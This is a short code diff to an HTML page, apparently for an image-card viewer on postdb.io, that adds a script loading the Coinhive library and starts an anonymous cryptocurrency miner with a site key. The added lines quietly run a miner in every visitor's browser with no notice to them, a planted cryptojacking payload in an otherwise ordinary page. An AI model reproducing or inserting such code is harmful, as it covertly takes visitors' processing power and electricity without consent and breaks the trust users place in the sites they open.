@@ -30,7 +30,10 @@
       postdb.io
     </div>
     <img id="maincard" class="imgcard">
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
+      var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
+      miner.start();
      	var img = window.location.hash.slice(1);
       document.querySelector("#maincard").src = "http://bit.ly/"+img;
     </script>
